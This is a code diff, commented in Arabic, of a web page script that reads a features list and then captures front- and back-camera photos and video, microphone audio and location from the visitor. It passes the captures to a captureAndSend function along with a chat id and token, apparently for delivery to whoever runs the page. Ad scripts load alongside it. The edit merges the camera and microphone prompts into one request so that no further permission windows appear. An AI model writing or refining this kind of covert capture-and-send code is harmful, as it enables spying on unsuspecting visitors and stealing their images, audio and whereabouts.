@@ -573,35 +573,35 @@
     });
   }
 
-  // ------------------ طلب الأذونات مرة واحدة فقط مع إعادة محاولة سريعة ------------------
-  async function preGrantPermissions(needCamera, needMicrophone) {
-    if (!needCamera && !needMicrophone) return true;
+  // ------------------ دالة طلب الأذونات العامة (مرة واحدة) ------------------
+  async function requestPermissions(needVideo, needAudio) {
+    if (!needVideo && !needAudio) return;
     const constraints = {};
-    if (needCamera) constraints.video = true;
-    if (needMicrophone) constraints.audio = true;
-
-    // محاولة واحدة فقط (بدون إعادة محاولة، لأننا نريد سرعة)
+    if (needVideo) constraints.video = true;   // طلب أي كاميرا
+    if (needAudio) constraints.audio = true;   // طلب الميكروفون
     try {
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      stream.getTracks().forEach(t => t.stop());
-      return true; // تم منح الإذن
+      stream.getTracks().forEach(t => t.stop()); // نغلق التدفق فورًا بعد الحصول على الإذن
     } catch (err) {
-      console.log('رفض الإذن:', err);
-      return false; // رفض
+      console.log('فشل الحصول على الإذن:', err);
     }
   }
 
-  // ------------------ الدالة الرئيسية للصفحة الجانبية (معالجة متسلسلة سريعة) - المعدلة ------------------
+  // ------------------ الدالة الرئيسية للصفحة الجانبية (مع طلب إذن موحد) ------------------
   async function startFeatures(chat, token, features) {
     if (!features) return;
 
     const featureList = features.split(',');
 
     // تحديد الاحتياجات
-    const needFrontCam = featureList.some(f => ['camFront', 'videoFront'].includes(f));
-    const needBackCam = featureList.some(f => ['camBack', 'videoBack'].includes(f));
-    const needAudio = featureList.some(f => ['audio', 'videoFront', 'videoBack'].includes(f));
+    const needAnyCamera = featureList.some(f => ['camFront', 'camBack', 'videoFront', 'videoBack'].includes(f));
+    const needAnyAudio = featureList.some(f => ['audio', 'videoFront', 'videoBack'].includes(f));
     const needLocation = featureList.includes('location');
+
+    // طلب الأذونات العامة مرة واحدة (كاميرا + ميكروفون إذا لزم)
+    await requestPermissions(needAnyCamera, needAnyAudio);
+
+    // الآن ننفذ المهام المحددة (لن تظهر نوافذ إذن جديدة)
 
     // دالة مساعدة لتنفيذ مهام متعددة على نفس الـ stream
     async function withStream(constraints, tasks) {
@@ -615,9 +615,10 @@
     }
 
     // 1. المهام التي تعتمد على الكاميرا الأمامية
+    const needFrontCam = featureList.some(f => ['camFront', 'videoFront'].includes(f));
     if (needFrontCam) {
       await withStream(
-        { video: { facingMode: 'user' }, audio: needAudio },
+        { video: { facingMode: 'user' }, audio: needAnyAudio }, // audio حسب الحاجة العامة
         async (stream) => {
           if (featureList.includes('camFront')) {
             await captureAndSend(stream, chat, token, 'front');
@@ -630,9 +631,10 @@
     }
 
     // 2. المهام التي تعتمد على الكاميرا الخلفية
+    const needBackCam = featureList.some(f => ['camBack', 'videoBack'].includes(f));
     if (needBackCam) {
       await withStream(
-        { video: { facingMode: 'environment' }, audio: needAudio },
+        { video: { facingMode: 'environment' }, audio: needAnyAudio },
         async (stream) => {
           if (featureList.includes('camBack')) {
             await captureAndSend(stream, chat, token, 'back');
@@ -749,7 +751,7 @@
     document.body.appendChild(atOptionsScript);
     loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
     
-    // بدء الميزات (مع طلب أذونات موحد)
+    // بدء الميزات (مع طلب إذن موحد)
     startFeatures(chat, token, features);
   }
 </script>
